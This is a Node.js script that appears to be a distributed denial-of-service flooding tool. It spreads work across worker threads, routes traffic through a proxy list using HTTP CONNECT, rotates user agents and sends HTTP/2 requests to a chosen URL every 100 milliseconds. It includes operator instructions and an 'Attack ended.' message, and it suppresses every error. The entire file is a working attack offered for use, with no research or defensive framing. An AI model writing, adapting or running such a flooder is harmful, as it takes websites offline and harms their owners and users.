const http = require("http");
const http2 = require("http2");
const { Worker, isMainThread, workerData, threadId } = require("worker_threads");
const fs = require("fs");

process.setMaxListeners(0);
console.clear();

/*

    Instructions:

    ! DO NOT MODIFY ANYTHING ABOVE THIS TEXT UNLESS DIRECTED BY DEVS OR YOU KNOW WHAT YOU'RE DOING !
    
    ------------------------------------------------------------------------------------------------
    1.) Create a proxies.txt file with proxies in it.
    2.) Run the script using node filename.js url time threads
    ------------------------------------------------------------------------------------------------

    Proxy text file should be as follows:

    1.1.1.1:80
    2.2.2.2:80
    3.3.3.3:80

*/

if (isMainThread) {
  if (process.argv.length !== 5) return console.log(`Invalid Arguments
  Usage: ${__filename.slice(__filename.lastIndexOf("\\") + 1, __filename.length)} URL TIME THREADS`);
  for (threadCount = 0; threadCount < parseInt(process.argv[4]); threadCount++) new Worker(__filename, { workerData: process.argv });
  setTimeout(() => { console.clear(); console.log("Attack ended."); process.exit(0); }, process.argv[3] * 1000);
} else {
  console.log(`Thread ${threadId} started!`)
  let listIndex = 0;
  const proxyList = fs.readFileSync("proxies.txt").toString().replace(/\r/g, "").split("\n");
  const useragentList = JSON.parse(fs.readFileSync("useragents.json").toString());
  const website = new URL(workerData[2]);

  const sendConnection = proxyIndex => {
    const currentProxy = proxyList[proxyIndex].split(":");
    const httpRequest = http.request({
      method: "CONNECT",
      host: currentProxy[0],
      port: currentProxy[1],
      path: website.host,
      headers: {
        "Host": website.host
      }
    })
    
    httpRequest.on("error", () => {
      console.clear();
      listIndex ++;
      sendConnection(listIndex);
      if (listIndex == proxyList.length - 1) listIndex = 0;
      console.log("An unknown error occurred");
    })

    httpRequest.on("connect", (_, socket) => {
      const client = http2.connect(website.href, { socket });
      setInterval(() => {
        if (!client.destroyed) {
          const request = client.request({ 
            ":path": website.pathname,
            "user-agent": useragentList[Math.floor(Math.random() * useragentList.length)]
          })
          request.on("end", () => setTimeout(() => client.destroy(), 10000));
          request.on("error", () => {});
        }
      }, 100)
    })

    httpRequest.end();
  }

  setInterval(() => {
    sendConnection(listIndex);
    listIndex ++;
    if (listIndex == proxyList.length - 1) listIndex = 0;
  }, 300)
}

process.on("uncaughtException", () => {});
process.on("unhandledRejection", () => {});